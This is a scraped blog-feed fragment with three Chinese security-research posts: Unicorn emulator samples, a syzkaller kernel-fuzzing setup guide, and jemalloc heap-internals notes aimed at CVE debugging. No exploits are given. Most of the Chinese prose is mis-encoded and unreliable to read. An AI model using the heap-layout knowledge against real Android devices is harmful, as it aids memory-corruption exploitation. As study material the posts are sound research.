44 45 46 47 48 49 50 51 52 53 54 55 56 57 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unicorn/unicorn.h\u0026gt; // è¦æ¨¡æ‹Ÿçš„æŒ‡ä»¤ #define X86_CODE32 \u0026#34;\\x41\\x4a\u0026#34; // INC ecx; DEC edx // èµ·å§‹åœ°å€ #define ADDRESS 0x1000000 int main(int argc, char const *argv[]){ // è®¾ç½®engine uc_engine *uc; uc_err err; //è®¾ç½®å¯„å­˜å™¨ int r_ecx = 0x1234; int r_edx = 0x5678; printf(\u0026#34;Emulate i386 code\\n\u0026#34;); // x86 32bit åˆå§‹åŒ– err = uc_open(UC_ARCH_X86, UC_MODE_32, \u0026amp;uc); if (err != UC_ERR_OK){ printf(\u0026#34;Failed on uc_open() with error returned: %u\\n\u0026#34;, err); return -1; } // ç»™æ¨¡æ‹Ÿå™¨ç”³è¯· 2MB å†…å­˜ uc_mem_map(uc, ADDRESS, 2 * 1024 * 1024, UC_PROT_ALL); // å°†è¦æ¨¡æ‹Ÿçš„æŒ‡ä»¤å†™å…¥å†…å­˜ if (uc_mem_write(uc, ADDRESS, X86_CODE32, sizeof(X86_CODE32) - 1)){ printf(\u0026#34;Failed to write emulation code to memory, quit!\\n\u0026#34;); return -1; } // åˆå§‹åŒ–å¯„å­˜å™¨ uc_reg_write(uc, UC_X86_REG_ECX, \u0026amp;r_ecx); uc_reg_write(uc, UC_X86_REG_EDX, \u0026amp;r_edx); printf(\u0026#34;\u0026gt;\u0026gt;\u0026gt; ECX = 0x%x\\n\u0026#34;, r_ecx); printf(\u0026#34;\u0026gt;\u0026gt;\u0026gt; EDX = 0x%x\\n\u0026#34;, r_edx); // æ¨¡æ‹Ÿä»£ç  err = uc_emu_start(uc, ADDRESS, ADDRESS + sizeof(X86_CODE32) - 1, 0, 0); if (err){ printf(\u0026#34;Failed on uc_emu_start() with error returned %u: %s\\n\u0026#34;, err, uc_strerror(err)); } // æ‰“å°å¯„å­˜å™¨å€¼ printf(\u0026#34;Emulation done. Below is the CPU context\\n\u0026#34;); uc_reg_read(uc, UC_X86_REG_ECX, \u0026amp;r_ecx); uc_reg_read(uc, UC_X86_REG_EDX, \u0026amp;r_edx); printf(\u0026#34;\u0026gt;\u0026gt;\u0026gt; ECX = 0x%x\\n\u0026#34;, r_ecx); printf(\u0026#34;\u0026gt;\u0026gt;\u0026gt; EDX = 0x%x\\n\u0026#34;, r_edx); uc_close(uc); return 0; } å®˜æ–¹ç»™äº†å¾ˆå¤šæµ‹è¯•æ¡ˆä¾‹\npython3:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 from __future__ import print_function from unicorn import * from unicorn.x86_const import * X86_CODE32 = b\u0026#34;\\x41\\x4a\u0026#34; #INC ecx; DEC edx ADDRESS = 0x1000000 print(\u0026#34;Emulate i386 code\u0026#34;) try: ## åˆå§‹åŒ–æ¨¡æ‹Ÿå™¨ä¸ºx86 32bit mu = Uc(UC_ARCH_X86,UC_MODE_32) # mu = Uc(UC_ARCH_ARM64,UC_MODE_64) ## 2MB çš„memory mu.mem_map(ADDRESS,2*1024*1024) ## mu.mem_write(ADDRESS,X86_CODE32) ## mu.reg_write(UC_X86_REG_ECX,0x1234) mu.reg_write(UC_X86_REG_EDX,0x7890) ## mu.emu_start(ADDRESS, ADDRESS + len(X86_CODE32)) print(\u0026#34;Emulation done. Below is the CPU context\u0026#34;) r_ecx = mu.reg_read(UC_X86_REG_ECX) r_edx = mu.reg_read(UC_X86_REG_EDX) print(\u0026#34;\u0026gt;\u0026gt;\u0026gt; ECX = 0x%x\u0026#34; %r_ecx) print(\u0026#34;\u0026gt;\u0026gt;\u0026gt; EDX = 0x%x\u0026#34; %r_edx) except UcError as e: print(\u0026#34;ERROR: %s\u0026#34; %e) 0x03 ä¸€äº›åŸºäºunicornçš„é¡¹ç›®ç®€å•ä½¿ç”¨ AndroidNativeEmu AndroidNativeEmu è®©ä½ èƒ½å¤Ÿè·¨å¹³å°æ¨¡æ‹ŸAndroid Nativeåº“å‡½æ•°ï¼Œæ¯”å¦‚JNI_OnLoadã€Java_XXX_XXç­‰å‡½æ•°\nè¿™æ˜¯çœ‹é›ªæ— åä¾ å¤§ä½¬äºŒæ¬¡ä¿®æ”¹ä¸€ä¸ªç‰ˆæœ¬ï¼ŒçœŸçš„å¤ªå¼ºäº†ã€‚\nå®‰è£…æŠ¥é”™è§£å†³\nå®‰è£…æœ‰äº›å‘ã€‚ã€‚\né¦–å…ˆè¦æ±‚ä½¿ç”¨python3.7ã€‚ä¹‹å\n1 2 3 4 git https://github.com/AeonLucid/AndroidNativeEmu.git pip install -r requirements.txt cd samples # è¿è¡Œpython example.pyå¼€å§‹æŠ¥é”™ã€‚ã€‚ åœ¨winä¸Šå…ˆæå®škeystone-engine\n1 git clone https://github.com/keystone-engine/keystonecd keystone/bindings/pythonpython setup.py install ä¸‹è½½ Windows - Core engine x64\nè§£å‹æ‰¾åˆ°keystone.dll æ”¾åˆ°X:\\location_to_python\\Lib\\site-packages\\keystone\\\nè¿˜æœ‰å¯èƒ½æŠ¥fail to load the dynamic library.\nä¸‹è½½ vcredist_x64 å®‰è£…ã€‚\nä¹‹åç›´æ¥python example.py ç»§ç»­æŠ¥ModuleNotFoundError: No module named 'androidemu'\nåŠ å…¥ä»£ç \n1 2 import sys sys.path.append(\u0026#39;../\u0026#39;) åˆæŠ¥FileNotFoundError: [Errno 2] No such file or directory: 'samples/example_binaries/libc.so'\nåˆ æ‰ä»£ç é‡Œçš„ samples/example_binaries/libc.soçš„samples/\nèƒ½è·‘èµ·æ¥ä½†æ˜¯æŠ¥é”™unicorn.unicorn.UcError: Invalid instruction (UC_ERR_INSN_INVALID)\næ”¹æˆemulator.load_library(\u0026quot;example_binaries/libc.so\u0026quot;, do_init=False)\nå°±æˆåŠŸè¿è¡Œ\nä½¿ç”¨\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 import logging import posixpath import sys sys.path.append(\u0026#39;../\u0026#39;) from unicorn import UcError, UC_HOOK_CODE, UC_HOOK_MEM_UNMAPPED from unicorn.arm_const import * from androidemu.emulator import Emulator from androidemu.java.java_class_def import JavaClassDef from androidemu.java.java_method_def import java_method_def import debug_utils class MainActivity(metaclass=JavaClassDef, jvm_name=\u0026#39;com/example/debugdemo/MainActivity\u0026#39;): def __init__(self): pass @java_method_def(name=\u0026#39;stringFromJNI\u0026#39;, signature=\u0026#39;()Ljava/lang/String;\u0026#39;, native=True) def string_from_jni(self, mu): pass def test(self): pass # Configure logging logging.basicConfig( stream=sys.stdout, level=logging.DEBUG, format=\u0026#34;%(asctime)s %(levelname)7s %(name)34s | %(message)s\u0026#34; ) logger = logging.getLogger(__name__) ## å…ˆåˆ›å»ºjava class ## åˆå§‹åŒ–emulater emulator = Emulator( vfs_root=posixpath.join(posixpath.dirname(__file__),\u0026#34;vfs\u0026#34;), vfp_inst_set=True ) ## æ³¨å†Œ java class emulator.java_classloader.add_class(MainActivity) ## load libraries emulator.load_library(\u0026#34;example_binaries/libdl.so\u0026#34;) emulator.load_library(\u0026#34;example_binaries/libc.so\u0026#34;) emulator.load_library(\u0026#34;example_binaries/libstdc++.so\u0026#34;) emulator.load_library(\u0026#34;example_binaries/libm.so\u0026#34;) tar_lib = emulator.load_library(\u0026#34;example_binaries/libtest.so\u0026#34;) # Show loaded modules. logger.info(\u0026#34;Loaded modules:\u0026#34;) for module in emulator.modules: logger.info(\u0026#34;=\u0026gt; 0x%08x - %s\u0026#34; % (module.base, module.filename)) try: ## Run JNI_OnLoad. emulator.call_symbol(tar_lib, \u0026#39;JNI_OnLoad\u0026#39;, emulator.java_vm.address_ptr, 0x00) emulator.mu.hook_add(UC_HOOK_MEM_UNMAPPED, debug_utils.hook_unmapped) # Do native stuff. emulator.mu.hook_add(UC_HOOK_CODE, debug_utils.hook_code) main_activity = MainActivity() logger.info(\u0026#34;Response from JNI call: %s\u0026#34; % main_activity.string_from_jni(emulator)) # Dump natives found. logger.info(\u0026#34;Exited EMU.\u0026#34;) logger.info(\u0026#34;Native methods registered to MainActivity:\u0026#34;) for method in MainActivity.jvm_methods.values(): if method.native: logger.info(\u0026#34;- [0x%08x] %s - %s\u0026#34; % (method.native_addr, method.name, method.signature)) except UcError as e: print(\u0026#34;Exit at %x\u0026#34; % emulator.mu.reg_read(UC_ARM_REG_PC)) raise samples æ–‡ä»¶å¤¹ä¸‹å‡ ä¸ªå…·ä½“çš„å®ä¾‹ unicorefuzz åˆå¹¶åˆ°AFLç³»åˆ—æ€»ç»“\nå‚è€ƒ ä¸­æ–‡æ–‡æ¡£https://github.com/kabeor/Micro-Unicorn-Engine-API-Documentation\nhttps://github.com/unicorn-engine/unicorn\nhttps://github.com/P4nda0s/AndroidNativeEmu\nhttps://app.yinxiang.com/fx/a6cc6633-a93f-4111-a06a-cccd5fa39e0f\nhttps://github.com/fgsect/unicorefuzz\n","date":"2020-04-17T00:00:00+08:00","permalink":"https://ykiko.top/p/unicorn%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/","title":"Unicornç®€å•å­¦ä¹ ä½¿ç”¨è®°å½•"},{"content":"syzkaller_fuzzing_å…¥é—¨ 0x00 ä»‹ç» syzkalleræ˜¯googleçš„å®‰å…¨ç ”ç©¶äººå‘˜å¼€å‘å¹¶ç»´æŠ¤çš„å†…æ ¸fuzzå·¥å…·ã€‚å®ƒä¸»è¦æ˜¯ç”¨goå†™çš„ï¼Œä¹Ÿæœ‰å°‘éƒ¨åˆ†Cä»£ç ï¼Œæ”¯æŒakaros/fuchsia/linux/android/freebsd/netbsd/openbsd/windowsç­‰ç³»ç»Ÿï¼Œå‘ç°çš„æ¼æ´å¤šè¾¾ä¸Šåƒã€‚\n0x01 ç¯å¢ƒé…ç½® ç¯å¢ƒè¦æ±‚ï¼š\nC/C++ ç¼–è¯‘å™¨\nGCC 6.1.0+ linux kernel\nç¼–è¯‘ v4.6ä»¥åç¼–è¯‘æ—¶ç¡®ä¿CONFIG_KCOV=y ä¹‹å‰ç‰ˆæœ¬ï¼šè¿™æ ·æ·»åŠ æ”¯æŒ\nä¸€äº›é¢å¤–é€‰é¡¹\nVM ä¸€èˆ¬QEMU\næ”¯æŒQEMUã€kvmtoolå’ŒGCEè™šæ‹Ÿæœºã€Androidè®¾å¤‡å’ŒOdroid C2å¼€å‘æ¿\néœ€è¦è¿›è¡Œé€šä¿¡ï¼švmè¦æä¾›ç½‘ç»œæ”¯æŒ\nvmé…ç½®éœ€è¦sshæœåŠ¡å™¨\nè¦èƒ½æ‰§è¡Œssh -i $SSHID -p $PORT root@localhost\néœ€è¦å°†debugfs æŒ‚åœ¨åˆ° /sys/kernel/debug\nGolang å®‰è£…\n1 2 3 4 5 6 7 8 9 10 wget https://dl.google.com/go/go1.14.1.linux-amd64.tar.gz tar -C ~/goroot -xzf go1.14.1.linux-amd64.tar.gz vim /etc/profile mkdir /usr/local/gopath # æ·»åŠ export export GOROOT=/home/kuekiko/goroot export GOPATH=/home/kuekiko/gopath export PATH=$GOROOT/bin:$PATH export PATH=$GOPATH/bin:$PATH source etc/profile syzkaller\n1 2 3 4 5 # build go get -u -d github.com/google/syzkaller/... cd $GOROOT/src/github.com/google/syzkaller/ make -j4 # buildä¹‹ååœ¨bin/ä¸‹ å¦‚æœè¦cross-OS/arch è¿›è¡Œæµ‹è¯•çš„è¯ï¼Œè®°å¾—ä¿®æ”¹TARGETOS, TARGETVMARCH å’ŒTARGETARCHå‚æ•°å†make 0x02 Init syzkaller ç”Ÿæˆé•œåƒ\n1 2 3 4 5 6 7 8 9 sudo apt install debootstrap cd gopath/src/github.com/google/syzkaller/tools/ # ä½¿ç”¨å›½å†…æº ä¿®æ”¹create-image.sh sudo debootstrap --include=$PREINSTALL_PKGS --components=main,contrib,non-free $RELEASE $DIR # æ”¹æˆ sudo debootstrap --include=$PREINSTALL_PKGS --components=main,contrib,non-free $RELEASE $DIR http://mirrors.163.com/debian/ ./create-image.sh # é€‰é¡¹ --distribution wheezy --feature full # ç”Ÿæˆäº†stretch.id_rsa stretch.id_rsa.pub stretch.img ç¼–è¯‘å¯åŠ¨ å†…æ ¸ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 export KERNEL=/home/kuekiko/linux_kernel export IMG=/home/kuekiko/linux_kernel/img export PATH=$KERNEL:$PATH export PATH=$IMG:$PATH # é»˜è®¤ç¼–è¯‘ cd $KERNEL/xxx make CC=\u0026#34;$GCC/bin/gcc\u0026#34; defconfig make CC=\u0026#34;$GCC/bin/gcc\u0026#34; kvmconfig # ç›´æ¥ make menuconfig # ç¼–è¾‘.config CONFIG_KCOV=y CONFIG_DEBUG_INFO=y CONFIG_KASAN=y CONFIG_KASAN_INLINE=y # æ–° CONFIG_CONFIGFS_FS=y CONFIG_SECURITYFS=y make CC=\u0026#34;$GCC/bin/gcc\u0026#34; olddefconfig make CC=\u0026#34;$GCC/bin/gcc\u0026#34; -j4 qemu 1 2 3 4 5 6 7 8 9 10 11 qemu-system-x86_64 \\ -kernel $KERNEL/arch/x86/boot/bzImage \\ -append \u0026#34;console=ttyS0 root=/dev/sda earlyprintk=serial\u0026#34;\\ -hda $IMAGE/stretch.img \\ -net user,hostfwd=tcp::10021-:22 -net nic \\ -enable-kvm \\ -nographic \\ -m 2G \\ -smp 2 \\ -pidfile vm.pid \\ 2\u0026gt;\u0026amp;1 | tee vm.log sshè¿æ¥\nssh -i $IMG/stretch.id_rsa -p 10021 -o \u0026quot;StrictHostKeyChecking no\u0026quot; root@localhost\nkill qemu ä½¿ç”¨kill $(cat vm.pid)\n0x03 Start Fuzzing æ·»åŠ é…ç½®æ–‡ä»¶my.cfg\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 { \u0026#34;target\u0026#34;: \u0026#34;linux/amd64\u0026#34;, \u0026#34;http\u0026#34;: \u0026#34;127.0.0.1:56741\u0026#34;, \u0026#34;workdir\u0026#34;: \u0026#34;$GOPATH/src/github.com/google/syzkaller/workdir\u0026#34;, \u0026#34;kernel_obj\u0026#34;: \u0026#34;$KERNEL\u0026#34;, \u0026#34;image\u0026#34;: \u0026#34;$IMAGE/stretch.img\u0026#34;, \u0026#34;sshkey\u0026#34;: \u0026#34;$IMAGE/stretch.id_rsa\u0026#34;, \u0026#34;syzkaller\u0026#34;: \u0026#34;$GOPATH/src/github.com/google/syzkaller\u0026#34;, \u0026#34;procs\u0026#34;: 4, \u0026#34;type\u0026#34;: \u0026#34;qemu\u0026#34;, \u0026#34;vm\u0026#34;: { \u0026#34;count\u0026#34;: 4, \u0026#34;kernel\u0026#34;: \u0026#34;$KERNEL/arch/x86/boot/bzImage\u0026#34;, \u0026#34;cpu\u0026#34;: 2, \u0026#34;mem\u0026#34;: 2048 } } å¯åŠ¨fuzzing\n./bin/syz-manager -config=my.cfg\næµè§ˆå™¨æ‰“å¼€http://127.0.0.1:56741/\nè™šæ‹Ÿæœºæ€§èƒ½å¤ªåƒåœ¾ï¼Œå¤ªæ…¢äº† fuzzingåŠå¤©æ²¡ä¹Ÿå•¥crashesã€‚è¿˜æ˜¯å¾—ç”¨æœåŠ¡å™¨ã€‚\næŒ‚æœºäº†å¤§æ¦‚3å°æ—¶ï¼Œå‡ºäº†å‡ ä¸ªæ²¡å•¥ç”¨çš„crachã€‚\n0x04 æ€»ç»“ è¿˜æœ‰å¾ˆå¤šé€‰é¡¹å¯ä»¥å¼€å¯ï¼Œæ²¡è¯•ã€‚\nçœ‹çœ‹å®ç°æºç ï¼Œè¿˜æœ‰å°±æ˜¯ä¹‹åè¯•è¯•Fuzzing Android\nå‚è€ƒ https://github.com/google/syzkaller\nhttps://www.freebuf.com/sectool/142969.html\nhttp://blog.douluodalu.wang/2020/03/22/syz-fuzz%E5%88%9D%E6%8E%A2/\nhttps://github.com/google/syzkaller/blob/master/docs/linux/setup.md\n","date":"2020-04-10T00:00:00+08:00","permalink":"https://ykiko.top/p/syzkaller_fuzzing_%E5%85%A5%E9%97%A8/","title":"syzkaller_fuzzing_å…¥é—¨"},{"content":"Androidä¹‹jemalloc 0x00 ç®€å•ä»‹ç» æƒ³è°ƒä¸€ä¸ªCVEã€å‘ç°å¯¹jemalloc äº†è§£å¤ªå°‘ã€‚é‡æ–°å¤ä¹ å¤ä¹ jemallocï¼Œåšä¸ªè®°å½•ã€‚\njemallocæœ€åˆæ˜¯2005å¹´ Jason Evanså¼€å‘çš„æ–°ä¸€ä»£å†…å­˜åˆ†é…å™¨ï¼Œ ä¹‹åæ²¡å¤šä¹…è¢«æ·»åŠ åˆ°FreeBSDçš„libcä¸­çš„é»˜è®¤å†…å­˜åˆ†é…å™¨ï¼Œç”¨æ¥æ›¿ä»£åŸæ¥çš„phkmallocã€‚2007å¹´ Firefox Mozillaé¡¹ç›®çš„ç‹¬ç«‹ç‰ˆæœ¬ä¹Ÿå°†jemallocä½œä¸ºä¸»è¦çš„åˆ†é…å™¨ã€‚2009å¹´ï¼ŒFacebook çš„åç«¯é¡¹ç›®ä¹Ÿå¹¿æ³›ä½¿ç”¨jemallocã€‚2014å¹´ï¼ŒAndroid 5 å¼€å§‹é‡‡ç”¨jemallocä½œä¸ºä¸»è¦çš„å†…å­˜åˆ†é…å™¨ï¼Œä¸è¿‡éƒ¨åˆ†Android5/6ä¾ç„¶èƒ½çœ‹åˆ°dlmallocå’Œjemallocä¸¤è€…å¹¶å­˜ã€‚\njemallocçš„ä¸€äº›ç‰¹æ€§ä¸è®¾è®¡åŸåˆ™ï¼š\nå¼ºå¤§çš„å¤šæ ¸/å¤šçº¿ç¨‹åˆ†é…èƒ½åŠ›.\næœ€å°åŒ–çš„å…ƒæ•°æ®å¼€é”€\nåŸºäºæ¯ä¸ªçº¿ç¨‹è¿›è¡Œç¼“å­˜ï¼Œé¿å…äº†åŒæ­¥é—®é¢˜ã€‚\né¿å…äº†è¿ç»­åˆ†é…å†…å­˜çš„ç¢ç‰‡åŒ–é—®é¢˜ã€‚\nç®€æ´é«˜æ•ˆ\n0x01 ç»“æ„ ç»“æ„å›¾\njemallocå¯¹å†…å­˜åˆ’åˆ†æŒ‰ç…§å¦‚ä¸‹ç”±é«˜åˆ°ä½çš„é¡ºåº:\nå†…å­˜æ˜¯ç”±ä¸€å®šæ•°é‡çš„arenasè¿›è¡Œç®¡ç†.ä¸€ä¸ªarenaè¢«åˆ†å‰²æˆè‹¥å¹²chunks, åè€…ä¸»è¦è´Ÿè´£è®°å½•bookkeepingï¼ˆè®°å½•ä¿¡æ¯ï¼‰.chunkå†…éƒ¨åˆåŒ…å«ç€è‹¥å¹²runs, ä½œä¸ºåˆ†é…å°å—å†…å­˜çš„åŸºæœ¬å•å…ƒ.runç”±pagesç»„æˆ, æœ€ç»ˆè¢«åˆ’åˆ†æˆä¸€å®šæ•°é‡çš„regionså¯¹äºsmall sizeçš„åˆ†é…è¯·æ±‚æ¥è¯´, è¿™äº›regionå°±ç›¸å½“äºuser memory.\narenas å¯¹äºAndroidæ¥è¯´ï¼š\né™åˆ¶äº†åªä½¿ç”¨ä¸¤ä¸ªarenas,æ¯ä¸ªå¸¦æœ‰ä¸€ä¸ªlockã€‚è¿™æ„å‘³ç€ï¼Œä¸åŒçº¿ç¨‹å°è¯•åˆ†é…å†…å­˜æ—¶ï¼Œä¼šå¾ªç¯ã€å¹³å‡åˆ†é…è‡³ä¸¤ä¸ªarenaï¼Œç¡®ä¿ä¸¤ä¸ªarenaæœ‰å¤§è‡´ç›¸ç­‰çš„è¿›ç¨‹æ•°é‡ã€‚åªæœ‰åœ¨ç›¸åŒçš„arenaä¸­åˆ†é…å†…å­˜æ—¶æ‰éœ€è¦è·å–lockã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 #/android.bp android_product_variables = { // Only enable the tcache on non-svelte configurations, to save PSS. malloc_not_svelte: { cflags: [ \u0026#34;-UANDROID_MAX_ARENAS\u0026#34;, \u0026#34;-DANDROID_MAX_ARENAS=2\u0026#34;, \u0026#34;-DJEMALLOC_TCACHE\u0026#34;, \u0026#34;-DANDROID_TCACHE_NSLOTS_SMALL_MAX=8\u0026#34;, \u0026#34;-DANDROID_TCACHE_NSLOTS_LARGE=16\u0026#34;, ], }, } ç”¨shadowæŸ¥çœ‹arenas\nchunk ä¸€ä¸ªarenaä¸‹ä¼šæœ‰è‹¥å¹²ä¸ªchunkï¼ŒAndroid 7ä¹‹å‰chunkä¸º256kï¼Œä¹‹å32ä½ç³»ç»Ÿæ”¹ä¸º512kï¼Œ64ä½ç³»ç»Ÿæ”¹ä¸º2MBã€‚\næ¯ä¸ªchunkéƒ½æœ‰ä¸€ä¸ªchunk head åŒ…å«ç€è¿™ä¸ªchunkçš„å…ƒæ•°æ®ï¼ˆmetadataï¼‰.Android 7ä¹‹åå…ƒæ•°æ®å¢åŠ äº†mapbiasä¸mapbits flagsã€‚\nchunkæ˜¯å­˜æ”¾runçš„å®¹å™¨ï¼Œå¤§å°å›ºå®šç›¸åŒï¼Œæ“ä½œç³»ç»Ÿè¿”å›çš„å†…å­˜è¢«åˆ’åˆ†åˆ°chunkä¸­ç®¡ç†\nchunkä¸­çš„å…ƒæ•°æ®ç»“æ„ï¼Œmapbit[0]ä¸mapmisc[0]æŒ‡å‘chunkä¸­çš„ç¬¬ä¸€ä¸ªrunï¼š\nchunkå…ƒæ•°æ®ä¸­mapmiscä¸­çš„bitmapç»“æ„ç®¡ç†ç€runä¸­çš„regionçš„åˆ†é…ä½¿ç”¨ï¼š\nchunk\nrun runæ˜¯å­˜æ”¾è¿ç»­çš„å¤§å°ç›¸åŒçš„regionçš„å®¹å™¨ï¼Œæ¯ä¸ªchunkä¸­ä¼šåŒ…å«è‹¥å¹²ä¸ªrunï¼Œè€Œrunçš„metadataä¼šå­˜æ”¾åœ¨chunkçš„headerå½“ä¸­ï¼Œè¿™æ ·regioné‡Œåªå­˜æ”¾æ•°æ®æœ¬èº«ï¼Œä¸å†æœ‰å†…å­˜å±æ€§è¯´æ˜ã€‚\nregion regionæ˜¯æœ€å°çš„å­˜å‚¨å•å…ƒï¼Œæ¯ä¸ªruné‡Œé¢çš„regionå¤§å°å®Œå…¨ç›¸åŒï¼Œä¹Ÿæ²¡æœ‰å…ƒæ•°æ®ï¼Œmallocå®é™…è¿”å›çš„æ˜¯regionçš„åœ°å€ã€‚\nbins jemallocä¹Ÿç”¨binæ¥ç®¡ç†å†…å­˜ï¼Œå…±æœ‰39ä¸ªbinsã€‚binçš„metadataå­˜æ”¾äºarenaçš„headerä¸­ï¼Œ39ä¸ªbinè¿˜ä¼šå­˜æ”¾å½“å‰æ­£åœ¨ä½¿ç”¨çš„runã€‚æ‰€æœ‰å¸¦æœ‰ç©ºé—²regionçš„runå’Œé—²ç½®çš„chunkä¿¡æ¯ä¼šè¢«æ”¾ç½®åœ¨çº¢é»‘æ ‘ç»“æ„å½“ä¸­ï¼Œè¿™æ ·å¯»æ‰¾ç©ºé—²å†…å­˜çš„å¤æ‚åº¦å¯ä»¥æ§åˆ¶åœ¨o(log(n))ã€‚\ntcache ä¸ºäº†ä¼˜åŒ–å¤šçº¿ç¨‹æ€§èƒ½ï¼Œjemallocè¿˜é‡‡ç”¨äº†LIFOç»“æ„çš„tcacheï¼Œå­˜æ”¾è¿‘æœŸè¢«é‡Šæ”¾çš„regionï¼Œæ¯ä¸ªçº¿ç¨‹çš„æ¯ä¸ªbinéƒ½å¯¹åº”ä¸€ä¸ªtcacheï¼Œå­˜æ”¾åœ¨tcacheä¸­çš„å†…å­˜å¹¶ä¸ä¼šè®¾ç½®freeæ ‡è®°ä½ï¼Œå¹¶ä¸”ç”±äºtacheé™„ç€äºçº¿ç¨‹æœ¬èº«ï¼Œä½¿å¾—å¤§éƒ¨åˆ†æƒ…å†µä¸‹ä»tcacheåˆ†é…å†…å­˜æ—¶å®Œå…¨æ— éœ€lockã€‚\nå½“jemallocæ–°åˆ†é…ä¸€å—å†…å­˜æ˜¯å‘ç°tcacheä¸ºç©ºï¼Œä¼šè§¦å‘prefilläº‹ä»¶ï¼Œæ­¤æ—¶jemallocä¼šå°†å•å‰çš„arenaä¸Šlock,å¹¶ä»å½“å‰runä¸­å–å‡ºä¸€å®šæ•°é‡çš„regionå­˜å…¥tcacheï¼Œä¿è¯tcacheä¸ä¸ºç©ºã€‚\nå½“tcacheæ»¡äº†ï¼ˆsmall binæ˜¯8ï¼Œlarger binæ˜¯20ï¼‰çš„æ—¶å€™ï¼Œä¼šè§¦å‘flush äº‹ä»¶ï¼Œä¼šé‡Šæ”¾éƒ¨åˆ†regionï¼Œå¹¶ä¸”æ‰ä¼šè¢«æ ‡è®°ä¸ºå·²é‡Šæ”¾ã€‚è¿™æ—¶è¿™äº›regionæ‰èƒ½è¢«å…¶ä»–çº¿ç¨‹è‡ªç”±åˆ†é…ã€‚\næ­¤å¤–ï¼Œjemallocä¹Ÿå®ç°æ˜¯GCæœºåˆ¶ã€‚ä¼šæœ‰ä¸€ä¸ªè®¡æ•°å™¨ç»Ÿè®¡ç”³è¯·å’Œé‡Šæ”¾ï¼Œè¾¾åˆ°é˜ˆå€¼ä¹‹åä¼šè§¦å‘ç‰¹åˆ«çš„äº‹ä»¶ï¼Œç›®æ ‡biné‡Œçš„tcacheçš„å››åˆ†ä¹‹ä¸‰çš„regionä¼šè¢«é‡Šæ”¾æ‰ã€‚ä¸‹æ¬¡GCæ—¶ä¼šè½®åˆ°ä¸‹ä¸€ä¸ªbinã€‚è¿™æ˜¯å¯ä»¥ä»tcacheä¸­åˆ é™¤regionå¹¶ä½¿å…¶æ¢å¤å¸¸è§„å¯ç”¨æ€§çš„å¦ä¸€ç§æ–¹æ³•ã€‚\nåˆ†é…æµç¨‹ è®¡ç®—ç”³è¯·å†…å­˜å¤§å°ä»å½“å‰çº¿ç¨‹çš„tcacheä¸­æ‰¾åˆ°åˆé€‚çš„binå¦‚æœtcacheä¸ºç©ºï¼Œå°±ä»å½“å‰çš„runä¸­prefillä¸€äº›regionè¿›æ¥å¦‚æœå½“å‰runè€—å°½ï¼Œå°±ä»ä½åœ°å€å¼€å§‹æ‰¾åˆ°ç¬¬ä¸€ä¸ªéç©ºrunå¦‚æœç°æœ‰runé‡Œæ²¡æœ‰è¶³å¤Ÿçš„å†…å­˜å°±åˆ†é…ä¸€ä¸ªæ–°runå¦‚æœchunké‡Œæ²¡æœ‰ç©ºé—´äº†å°±åˆ†é…ä¸€ä¸ªæ–°chunkï¼ŒåŒæ—¶åˆ†é…æ–°runå¹¶prefillä¸€äº›regionåˆ°tcache\n0x02 shadow ä½¿ç”¨shadowæŸ¥çœ‹Androidä¸­çš„å†…å­˜å¸ƒå±€ï¼Œç®€å•å­¦ä¹ ä¸‹shadowçš„ä½¿ç”¨\næŸ¥çœ‹arenas å¯ä»¥çœ‹åˆ°ä¸€å…±ä¸¤ä¸ªarenasï¼Œæ¯ä¸ªarenaæœ‰36ä¸ªbinï¼Œä¸€å…±2ä¸ªchunkã€‚\næŸ¥çœ‹chunks å•ä¸ªchunkï¼ŒæŸ¥çœ‹chunkä¸­çš„run\næŸ¥çœ‹runsï¼Œä¼šåˆ—å‡ºå•å‰æ‰€æœ‰çš„runçš„è¯¦æƒ… run_siez = region_size*no_regions\nåªæ˜¾ç¤ºå•å‰è¿è¡Œä¸­çš„run\næ˜¯å¦æ˜¯allocatedçŠ¶æ€æ˜¯æ ¹æ®arena_chunk_map_bits_s å¯¹åº” bitsçš„ ç¬¬ [0] bit æ¥ç¡®å®š è¿™é‡Œjemalloc5 å’Œ jemalloc4 3ä¸ä¸€æ ·ã€‚\næŸ¥çœ‹å•ä¸ªrunçš„è¯¦æƒ…ï¼š\nrunçš„å¸ƒå±€å¦‚ä¸‹ï¼š\næºä»£ç arena.hä¸­æœ‰å¾ˆå¤šå…³äºbitsä¹‹ç±»çš„æ³¨é‡Šã€‚èƒ½å¤Ÿå¸®åŠ©ç†è§£ã€‚\næŸ¥çœ‹bins:\n1 2 3 4 5 6 struct arena_bin_s { malloc_mutex_t lock; arena_run_t *runcur; arena_run_heap_t runs; //4ä¹‹å‰ç‰ˆæœ¬ä¸ºarena_run_tree_t ç±»å‹ malloc_bin_stats_t stats; //ç»Ÿè®¡ä¿¡æ¯ } runcur: å½“å‰å¯ç”¨äºåˆ†é…çš„run, ä¸€èˆ¬æƒ…å†µä¸‹æŒ‡å‘åœ°å€æœ€ä½çš„non-full run, åŒä¸€æ—¶é—´ä¸€ä¸ªbinåªæœ‰ä¸€ä¸ªcurrent runç”¨äºåˆ†é….\nçœ‹åˆ«äººçš„æ–‡ç« è¯´æ˜¯é™¤å»0å·binä»¥å¤–æ²¡4ä¸ªbinä¸ºä¸€ç»„ï¼Œç»„å†…sizeå·®ä¸€æ ·ï¼Œä½†æ˜¯åœ¨è¿™é‡Œå¯ä»¥çœ‹åˆ°æ¯8ä¸ªä¸ºä¸€ç»„ï¼Œ01-8å·binçš„sizeå·®å€¼éƒ½ä¸º0x10,ç®—æ˜¯ç¬¬ä¸€ç»„ï¼Œé‚£ç¬¬äºŒç»„å°±ä¸º9-12å·ï¼Œåªæœ‰4ä¸ªbin 